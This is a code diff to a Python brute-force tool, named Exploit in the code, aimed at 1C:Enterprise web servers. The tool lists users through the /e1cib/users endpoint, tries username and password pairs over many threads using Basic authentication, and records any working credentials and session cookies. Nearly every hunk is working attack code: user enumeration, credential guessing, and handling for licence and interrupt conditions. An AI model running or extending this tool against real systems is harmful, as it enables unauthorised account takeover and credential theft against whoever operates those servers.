@@ -101,7 +101,8 @@ def parse_args() -> argparse.Namespace:
         "Username",
         metavar="users",
         type=pathlib.Path,
-        help="The usernames list"
+        help="The usernames list",
+        nargs="?"
     )
 
     parser.add_argument(
@@ -184,12 +185,13 @@ class ExploitConfig(object):
     """
 
     target: str
-    usernames_file: pathlib.Path
     startAt: int
     delay: int
     check_empty_passwords: bool
     get_users: bool
+    save_results: bool
 
+    usernames_file: Optional[pathlib.Path] = None
     passwords_file: Optional[pathlib.Path] = None
     threads: int = 10
     version: Optional[str] = None
@@ -223,10 +225,10 @@ class FileHandler(object):
         try:
             with filename.open("r", encoding="UTF-8") as file:
                 data = [line.strip() for line in file.readlines()]
-            logging.info(f"Data loaded from '{filename}'")
+            logging.info(f"[i] Data loaded from '{filename}'")
             return data
         except IOError as e:
-            logging.error(f"Error loading file '{filename}': {e}")
+            logging.error(f"[!] Error loading file '{filename}': {e}")
             return []
 
     @staticmethod
@@ -242,9 +244,9 @@ class FileHandler(object):
         try:
             with filename.open("a", encoding="UTF-8") as file:
                 file.write(f"{data}\n")
-            logging.info(f"Data saved to '{filename}'")
+            logging.info(f"[i] Data saved to '{filename}'")
         except IOError as e:
-            logging.error(f"Error saving to file '{filename}': {e}")
+            logging.error(f"[!] Error saving to file '{filename}': {e}")
 
 
 class Exploit(object):
@@ -270,7 +272,7 @@ class Exploit(object):
         """
         url = f"{self.config.target}/{self.config.lang}/e1cib/users"
         try:
-            response = requests.post(url)
+            response = requests.get(url)
             response.raise_for_status()
 
             user_data = response.text
@@ -279,7 +281,7 @@ class Exploit(object):
 
             return users
 
-        except requests.RequestException as e:
+        except Exception as e:
             logger.exception(
                 "[!] Unable to get users. Try again or provide users manually!"
                 f" {e}"
@@ -297,7 +299,7 @@ class Exploit(object):
         :return: encoded cred
         :rtype: str
         """
-        credentials = f"{login}:{password}" if password else f"{login}"
+        credentials = f"{login}:{password}" if password else f"{login}"
         return base64.b64encode(
             credentials.encode("utf-8")
         ).decode("utf-8")
@@ -320,7 +322,7 @@ class Exploit(object):
                 "Provide version manually with '--verion <version>'"
             )
             sys.exit(1)
-        except requests.exceptions.RequestException as e:
+        except Exception as e:
             logger.exception(f"Error determining version: {e}")
             sys.exit(1)
 
@@ -341,7 +343,9 @@ class Exploit(object):
             match response.status_code:
                 case 200:
                     logging.info(
-                        f"\033[92m[+] Success: {login}:{password}\033[0m"
+                        f"{PrintColors.OKGREEN.value}"
+                        f"[+] Success: {login}:{password}"
+                        f"{PrintColors.ENDC.value}"
                     )
                     self.found_credentials.append(f"{login}:{password}")
                     cookie = response.headers.get(
@@ -360,14 +364,18 @@ class Exploit(object):
                         )
                 case 400:
                     logging.error(
-                        "No free license for new user's session. Try later."
+                        "[!] No free license for new user's session, try later"
                     )
                     sys.exit(1)
 
             sleep(self.config.delay / 1000)
 
         except requests.exceptions.RequestException as e:
-            logging.exception(f"[!] Error: {e}")
+            logging.exception(f"[!] Request error: {e}")
+        except KeyboardInterrupt:
+            pass
+        except Exception as e:
+            logging.exception(f"[!] Other error: {e}")
 
     def start_exploit(self) -> List[str]:
         """
@@ -377,14 +385,17 @@ class Exploit(object):
         :rtype: List[str]
         """
         users = (
-            self._get_users()
-            if self.config.get_users
-            else FileHandler.load(
+            FileHandler.load(
                 self.config.usernames_file
             )[self.config.startAt:]
+            if (
+                self.config.usernames_file
+                and not self.config.get_users
+            )
+            else self._get_users()
         )
         if not users:
-            logging.error("No users provided. Shutting down.")
+            logging.error("[!] No users provided. Shutting down")
             sys.exit(1)
 
         passwords = (
@@ -396,7 +407,8 @@ class Exploit(object):
             else [""]
         )
         logging.info(
-            f"Starting with {len(users)} users and {len(passwords)} passwords"
+            f"[i] Starting with {len(users)} users"
+            f" and {len(passwords)} passwords"
         )
 
         with ThreadPoolExecutor(max_workers=self.config.threads) as executor:
@@ -411,9 +423,13 @@ class Exploit(object):
                 for future in as_completed(futures):
                     future.result()
             except KeyboardInterrupt:
-                logging.info("Interrupted by user. Shutting down...")
-                executor.shutdown(wait=True)
+                logging.info("[*] Interrupted by user. Shutting down...")
+                for future in futures:
+                    future.cancel()
+                executor.shutdown(wait=False)
                 sys.exit(1)
+            except Exception as e:
+                logger.exception(f"[!] Error: {e}")
 
         return self.found_credentials
 
@@ -438,18 +454,23 @@ def main():
         check_empty_passwords=args.check_empty_passwords,
         get_users=args.get_users,
         version=args.version,
-        threads=args.threads
+        threads=args.threads,
+        save_results=args.save_results
     )
 
     exploit = Exploit(config)
 
-    logging.info(f"Bruteforce started at {strftime('%d-%m-%Y %H:%M:%S %Z')}")
+    logging.info(
+        f"[i] Bruteforce started at {strftime('%d-%m-%Y %H:%M:%S %Z')}"
+    )
     found_credentials = exploit.start_exploit()
-    logging.info(f"Bruteforce completed at {strftime('%d-%m-%Y %H:%M:%S %Z')}")
-    logging.info(f"Found {len(found_credentials)} password(s).")
+    logging.info(
+        f"[i] Bruteforce completed at {strftime('%d-%m-%Y %H:%M:%S %Z')}"
+    )
+    logging.info(f"[i] Found {len(found_credentials)} password(s).")
 
     if found_credentials:
-        logging.info("Credentials found:")
+        logging.info("[*] Credentials found:")
         for cred in found_credentials:
             logging.info(
                 f"{PrintColors.OKGREEN.value}{cred}{PrintColors.ENDC.value}"
